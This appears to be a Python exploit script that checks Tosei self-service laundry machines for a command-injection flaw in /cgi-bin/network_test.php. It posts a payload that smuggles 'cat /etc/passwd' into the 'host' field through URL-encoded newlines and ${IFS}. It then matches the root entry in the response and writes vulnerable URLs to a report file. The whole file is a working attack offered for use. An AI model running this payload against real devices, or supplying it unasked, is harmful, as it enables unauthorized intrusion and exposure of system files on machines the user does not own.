import re
import requests
import time
import buter
import wirtefile

info = "Tosei自助洗衣机network_testRCE"
filename = f"./reps/{info}-"+str(time.strftime("%Y-%m-%d", time.localtime()))
poc = '/cgi-bin/network_test.php'
data = '''host=%0acat${IFS}/etc/passwd%0a&command=ping'''

headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
        "Content-Type": "application/x-www-form-urlencoded"
}
def toseiRCE(url):
    try:
        reps = requests.post(url=url + poc, headers=headers, data=data, verify=False, timeout=5)
        pattern = re.compile(r'root:.*:0:0')
        match = pattern.search(reps.text)
        if match and reps.status_code == 200:
            print(buter.colors.GREEN+  f"存在{info} url : {url}\n{match.group()}" + buter.colors.END)
            reptext = reps.url+"\n"+match.group()
            wirtefile.writefiles(filename,reptext)
        else:
            print(buter.colors.RED+ f"未发现{info} url : {url} " + buter.colors.END)
    except Exception as e:
        print(buter.colors.END+f"ERROR : {e}"+buter.colors.END)
